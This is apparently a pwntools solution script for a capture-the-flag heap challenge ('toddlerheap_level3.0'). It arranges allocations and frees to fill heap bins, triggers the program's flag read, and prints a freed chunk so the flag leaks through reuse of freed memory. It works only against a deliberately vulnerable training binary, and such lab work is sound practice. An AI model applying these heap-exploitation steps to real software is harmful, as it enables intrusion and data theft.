from pwn import *

context.arch = 'amd64'

p = process("/challenge/toddlerheap_level3.0")

def fill_bins():
    for idx in range(3):
        p.sendline(f'malloc {idx} 1500')
    p.sendline(b"malloc 3 1480")
    p.sendline(b"malloc 4 1480")

    for idx in range(5):
        p.sendline(f"free {idx}")

fill_bins()

p.sendline(b"read_flag")
p.sendline(b"puts 4")
p.interactive()
